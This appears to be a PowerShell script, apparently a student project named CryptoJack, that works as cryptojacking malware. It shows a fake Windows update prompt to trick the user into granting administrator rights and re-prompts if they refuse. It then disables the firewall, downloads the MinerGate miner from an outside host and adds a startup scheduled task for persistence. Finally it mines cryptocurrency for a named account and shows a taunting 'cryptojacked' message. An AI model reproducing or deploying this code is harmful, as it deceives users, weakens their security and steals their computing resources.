Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework
$ScriptPath = $MyInvocation.MyCommand.Path
$ScriptDir  = Split-Path -Parent $ScriptPath
$PSCommandPath = $ScriptDir + "\CryptoJack1.ps1"
# Get the ID and security principal of the current user account
$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent();
$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID);

# Get the security principal for the administrator role
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator;

function promptAdminRights
{   Add-Type -AssemblyName System.Windows.Forms
    $global:balmsg = New-Object System.Windows.Forms.NotifyIcon
    $path = (Get-Process -id $pid).Path
    $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
    $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
    $balmsg.BalloonTipText = "New Windows update available `r`n Click Here to View"
    $balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
    $balmsg.Visible = $true
    $balmsg.ShowBalloonTip(0)
    $balmsg.dispose()
    $msgBoxInput =  [System.Windows.MessageBox]::Show("Windows would like to update your system. `r`n Please give Powershell permission to update.",'Windows Software Update','YesNoCancel','Warning')
    switch  ($msgBoxInput) 
    {

        'Yes' 
        {
            
            
          Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;              


        }
        'No'
        {
            promptAdminRights
        }
        'Cancel'
        {
            promptAdminRights
        }
    }
}

function runScript 
{

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host Preparing Download ...    
    $download = "https://minergate.com/download/xfast-win-cli"
    $outputPath = $ScriptDir + "\test.zip"
    $destinationPath = $ScriptDir
    $batchFilePath = $ScriptDir + "\CryptoJack.bat"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($download, $outputPath)
    
    cd $destinationPath 

    if(!(Test-Path $outputPath))
    {
        runScript
    }else
    {
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host "Files Downloaded :D ..."
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Expand-Archive -LiteralPath $outputPath -DestinationPath C: -Force
        Copy-Item -LiteralPath $batchFilePath -Destination C: -Force
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host "Extracting Files ..."
        Expand-Archive -LiteralPath $outputPath -DestinationPath $destinationPath -Force
        [console]::beep(349,350)
        Remove-Item -Path $outputPath
        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
        $action = New-ScheduledTaskAction Start-Process powershell $batchFilePath
        Register-ScheduledTask -AsJob -Trigger $trigger -Action $action -TaskName CryptoJack -Force
        Start-ScheduledTask -TaskName CryptoJack
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host "Files Extracted!!!!"
        [console]::beep(349,350)
        Write-Host 
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        [console]::beep(349,350)
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host .
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host  
        Write-Host . . .
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host . . . .
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host . . . . .
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        [console]::beep(349,350)
        Clear-Host 
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host - - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host - - - - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host - - - - - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - - - - - -
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - - - - - - - - - - - - - - -
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        Write-Host 
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - - - - - - 
        Write-Host 
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host - - - - - - - - - - - - - - - -
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        Clear-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host
        Write-Host 
        Write-Host
        Write-Host - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        Write-Host 
        Write-Host     "Y O U   H A V E   B E E N   C R Y P T O J A C K E D   >:D"
        Write-Host 
        Write-Host - - - - - - -
        Write-Host 
        Write-Host     "C R Y P T O M A N:   2 0 1 4 7 7 4 8 8"
        Write-Host - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        $msgBoxInput =  [System.Windows.MessageBox]::Show(" `r`n - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - `r`n Y O U   H A V E   B E E N   C R Y P T O J A C K E D   >:D `r`n`r`n Thank you for your services `r`n`r`n - - - - - - - `r`n`r`n     C R Y P T O M A N:   2 0 1 4 7 7 4 8 8 `r`n`r`n - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ",'CRYPTOJACK v1.0','OK','Warning')
        [console]::beep(349,350)
        [console]::beep(349,350)
        [console]::beep(349,350)
        minergate-cli.exe --user 201477488@student.uj.ac.za --xmr 2
        minergate-cli.exe --user 201477488@student.uj.ac.za --btc 2 
        minergate-cli.exe --user 201477488@student.uj.ac.za --xmo+fcn 2
    }
     
              
}

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{  
    promptAdminRights
}else
{
    runScript 
} 


